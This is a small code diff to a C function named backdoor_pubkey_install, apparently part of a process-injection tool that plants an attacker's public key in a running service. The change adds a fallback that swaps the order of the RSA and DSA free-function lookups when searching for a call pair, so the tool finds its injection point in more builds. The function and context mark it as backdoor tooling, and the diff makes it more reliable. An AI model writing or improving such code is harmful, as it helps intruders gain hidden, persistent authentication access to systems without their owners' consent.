@@ -83,6 +83,11 @@ void backdoor_pubkey_install(inject_ctx *ctx, char *pubkey) {
 					));
 
 					callpair_b = find_callpair(p_rsa_free, p_dsa_free);
+
+					if(callpair_b == 0) {
+						callpair_b = find_callpair(p_dsa_free, p_rsa_free);
+					}
+
 					signatures[i].addr = find_entrypoint_inner(callpair_b, 3);
 				break;
 
